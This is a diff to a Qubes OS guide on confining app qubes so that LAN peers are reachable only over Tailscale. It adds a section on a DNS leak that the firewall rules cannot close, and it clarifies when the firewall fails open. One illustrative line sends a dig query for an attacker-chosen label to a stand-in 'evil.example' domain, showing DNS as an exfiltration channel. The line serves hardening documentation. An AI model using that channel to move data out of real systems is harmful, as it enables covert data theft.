@@ -2,8 +2,9 @@
 
 *A field guide for Qubes OS app qubes that run Tailscale **inside** the qube. Goal: other
 devices on the physical LAN can be reached **only** over the tailnet (the `100.64.0.0/10` CGNAT
-range, i.e. `100.x`), never via their raw LAN IPs — so no plaintext LAN path exists and all peer traffic rides
-authenticated, encrypted WireGuard. Reproduced end-to-end on Qubes OS 4.x with Tailscale running
+range, i.e. `100.x`), never via their raw LAN IPs — so for general traffic no plaintext LAN path
+remains and peer traffic rides authenticated, encrypted WireGuard. One structural exception — DNS —
+survives this recipe and is carved out in §5. Reproduced end-to-end on Qubes OS 4.x with Tailscale running
 in Debian- and Fedora-based app qubes. The drop recipe below is **IPv4**; IPv6 is handled
 explicitly in §4.*
 
@@ -47,8 +48,8 @@ The tunnel does its work *above* the firewall. Consequences:
   firewall never sees `100.x` on the wire, and you'd have blocked the public-internet underlay
   the tunnel depends on.
 - The correct lever is the inverse: **drop the one physical LAN subnet** (so no qube process can
-  open a plaintext socket to a LAN neighbor) while leaving general internet egress open (so the
-  WireGuard underlay, control plane, and DERP keep working).
+  open a plaintext socket to a LAN neighbor — DNS excepted, see §5) while leaving general internet
+  egress open (so the WireGuard underlay, control plane, and DERP keep working).
 
 Everything a locked-down qube reaches on the LAN must therefore go by its tailnet address
 (`100.x`) or MagicDNS name, which resolves to `100.x` — the raw LAN path is simply absent.
@@ -194,16 +195,30 @@ link, so a `fe80::/10` drop would blackhole the gateway (and NDP) and break v6 e
 
 - **Never blanket-block `10.0.0.0/8` or `172.16.0.0/12`.** Qubes' own gateway, inter-qube NAT,
   and DNS live in `10.137.x` / `10.138.x` / `10.139.x`. Block **only** the specific physical LAN
-  subnet from §2. (DNS keeps working: a qube's resolvers are the Qubes `10.139.x` addresses, not
-  the LAN router.)
+  subnet from §2.
+
+- **DNS is the carve-out this recipe cannot close.** DNS keeps working because a qube's resolvers
+  are the Qubes `10.139.x` addresses — but that is the *address*, not where the packets go. Qubes'
+  DNS redirect (`qubes-setup-dnat-to-ns`) is a `nat`/`prerouting` DNAT that runs **before** the
+  filter chain your `qvm-firewall` rules live in, and each hop rewrites toward *the netvm's own*
+  resolvers — so the final rewrite to the real LAN resolver happens in `sys-net`, where this
+  qube's rules are not applied at all. The qube-side chain only ever sees `daddr 10.139.x`, which
+  the LAN-subnet drop does not match; no §3 rule can close it. Net effect:
+  `dig @10.139.1.1 <attacker-chosen-label>.evil.example` from a locked-down qube still puts a
+  cleartext query on the wire to the LAN router — a low-bandwidth but real plaintext (and
+  exfiltration) channel, and with MagicDNS on (§8) tailscaled forwards all non-tailnet lookups to
+  exactly these resolvers. Closing it means changing where *upstream* DNS goes (DNS-over-HTTPS/TLS
+  in `sys-net`, or resolvers reached over the tailnet) — an upstream change outside this guide's
+  per-qube scope.
 
 - **Same-LAN tailnet peers lose their *direct* path → fall back to DERP.** Tailscale's fast
   direct route to a peer that's on the same physical LAN uses that peer's address inside your
   physical LAN CIDR (e.g. `192.168.1.x`) as the WireGuard underlay. Dropping the LAN subnet drops that too, so traffic to same-LAN peers
   reroutes through a DERP relay — still encrypted and "over the tailnet," but with added latency
   and a dependence on reaching the relay. This is the **perf-vs-purity trade-off**: it's the
-  intended cost of guaranteeing no plaintext LAN path. (Allowing a specific peer's LAN IP back in
-  would restore direct speed but reopens a plaintext route — don't, unless you mean to.)
+  intended cost of removing the plaintext LAN path for general traffic. (Allowing a specific
+  peer's LAN IP back in would restore direct speed but reopens a plaintext route — don't, unless
+  you mean to.)
 
 - **Multicast/broadcast discovery is link-scoped — and in standard Qubes it doesn't reach the
   LAN.** mDNS (`224.0.0.251`, `ff02::fb`), SSDP/WS-Discovery (`239.255.255.250`) and friends are
@@ -234,8 +249,14 @@ qube — and its firewall service — being up.
 `sys-firewall` is built from a template typically **shared** with other qubes; updating that
 template means **cycling `sys-firewall`**. Two things are worth knowing about that window:
 
-- A qube **started while its netvm isn't applying rules fails *closed*** — it simply has no
-  networking. That's the safe direction.
+- A qube **started while the netvm's `qubes-firewall` daemon is up but hasn't yet installed that
+  qube's chain fails *closed*** — the daemon's base ruleset carries `policy drop`, so nothing
+  forwards until the per-VM rules land. That reassurance has a precondition, though: if the
+  daemon is **not running at all** (crashed, masked, or the window before
+  `qubes-firewall.service` comes up on a netvm restart), the only forward hook present is the
+  boot-time `table qubes` chain, whose policy is **accept** — the qube then has full unfiltered
+  egress, LAN included. "Fails closed" is a property of the daemon's chain, not of the netvm as a
+  whole.
 - The case to think about is a qube that is **already running** through a netvm that briefly
   cycles. Don't *assume* the per-qube policy is continuous across that event; treat the boundary as
   potentially open while the net qube or its firewall service is down/restarting. How wide that
